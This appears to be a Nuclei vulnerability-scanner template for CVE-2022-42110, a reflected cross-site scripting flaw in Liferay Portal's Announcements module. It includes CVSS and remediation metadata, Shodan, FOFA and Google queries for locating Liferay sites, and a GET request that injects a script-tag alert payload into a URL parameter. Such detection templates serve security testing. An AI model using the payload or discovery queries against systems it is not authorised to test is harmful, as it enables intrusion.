id: CVE-2022-42110

info:
  name: Liferay Portal XSS Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: A Cross-site scripting (XSS) vulnerability in the Announcements module in Liferay Portal 7.1.0 through 7.4.2, and Liferay DXP 7.1 before fix pack 27, 7.2 before fix pack 17, and 7.3 before service pack 3 allows remote attackers to inject arbitrary web script or HTML.
  impact: |
    Successful exploitation could lead to unauthorized access or data theft.
  remediation: |
    Apply the latest security patches provided by Liferay to mitigate the XSS vulnerability.
  reference:
    - https://issues.liferay.com/browse/LPE-17403
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-42110
    cwe-id: CWE-79
    epss-score: 0.00112
    epss-percentile: 0.45965
    cpe: cpe:2.3:a:liferay:liferay_portal:*:*:*:*:*:*:*:*
  metadata:
    vendor: liferay
    product: liferay_portal
    shodan-query: http.favicon.hash:129457226
    fofa-query:
      - icon_hash=129457226
      - title="liferay"
    google-query: intitle:"liferay"

http:
  - method: GET
    path:
      - "{{BaseURL}}/web/guest/home?p_p_id=com_liferay_announcements_web_portlet_AnnouncementsPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_announcements_web_portlet_AnnouncementsPortlet_messageId=1%22%3E%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"

    matchers:
      - type: word
        words:
          - "<script>alert('XSS')</script>"
        part: body
